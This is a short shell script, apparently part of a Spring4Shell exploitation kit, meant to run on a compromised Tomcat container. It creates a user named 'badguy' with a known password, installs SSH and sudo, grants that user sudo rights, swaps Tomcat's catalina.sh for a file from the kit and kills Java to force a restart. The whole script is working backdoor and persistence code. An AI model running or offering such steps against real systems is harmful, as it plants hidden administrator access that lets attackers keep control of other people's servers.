echo "create user badguy:badguy"
useradd -p $(openssl passwd -crypt badguy) badguy
echo "install some apps"
apt install ssh nano sudo -y
echo "add user to sudoers"
usermod -aG sudo badguy
echo "replace catalina.sh"
mv ./spring4shell-scripts-main/catalina.sh /usr/local/tomcat/bin/catalina.sh -f
echo "force container restart"
pkill java